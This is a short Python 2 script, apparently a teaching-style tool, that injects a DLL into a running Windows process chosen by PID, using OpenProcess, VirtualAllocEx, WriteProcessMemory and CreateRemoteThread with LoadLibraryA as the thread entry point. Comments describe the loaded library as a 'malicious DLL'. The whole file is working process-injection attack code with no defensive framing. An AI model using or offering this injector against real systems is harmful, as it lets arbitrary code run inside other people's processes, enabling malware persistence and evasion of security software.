import sys
from ctypes import *

# Injection occurs via Remote Thread Creation
#
# HANDLE WINAPI CreateRemoteThread(
#   HANDLE hProcess,
#   LPSECURITY_ATTRIBUTES lpThreadAttributes,
#   SIZE_T dwStackSize,
#   LPTHREAD_START_ROUTINE lpStartAddress,   Where in memory the thread will begin executing
#   LPVOID lpParameter,                      Pointer to memory location that you control, param to function lpStartAdd
#   DWORD dwCreationFlags,
#   LPDWORD lpThreadId
# );

# Function to load DLL into memory
#
# HMODULE LoadLibrary(
#     LPCTSTR lpFileName        pointer to string value of path to malicious DLL
# );

# In CreateRemoteThread, lpStartAddress will be the address of the LoadLibraryA()
# and lpParameter will be the path to the DLL we want to load

# Run: ./dll_injector <PID> <Path to DLL>

PAGE_READWRITE  = 0x04
PROCESS_ALL_ACCESS = ( 0x000F0000 | 0x00100000 | 0xFFF )
VIRTUAL_MEM = ( 0x1000 | 0x2000 )

kernel32 = windll.kernel32
pid      = sys.argv[1]
dll_path = sys.argv[2]
dll_len  = len(dll_path)

# Get handle to process into which we are injecting
h_process = kernel32.OpenProcess( PROCESS_ALL_ACCESS, False, int(pid) )

if not h_process:
    print "[*] Couldn't acquire a handle to PID: %s" % pid
    sys.exit(0)

# Allocate space for the DLL path
arg_address = kernel32.VirtualAllocEx(h_process, 0, dll_len, VIRTUAL_MEM, PAGE_READWRITE)

# Write DLL path into allocated space
written = c_int(0)
kernel32.WriteProcessMemory(h_process, arg_address, dll_path, dll_len, byref(written))

# Resolve the address for LoadLibraryA
h_kernel32 = kernel32.GetModuleHandleA("kernel32.dll")
h_loadlib = kernel32.GetProcAddress(h_kernel32, "LoadLibraryA")

# Attempt to create the remote thread, with entry point set to LoadLibraryA
# and a pointer to DLL path as its single parameter
thread_id = c_ulong(0)

if not kernel32.CreateRemoteThread(h_process, None, 0, h_loadlib, arg_address, 0, byref(thread_id)):

    print "[*] Failed to inject the DLL. Exiting."
    sys.exit(0)

print "[*] Remote thread with ID 0x%08x created." % thread_id.value

















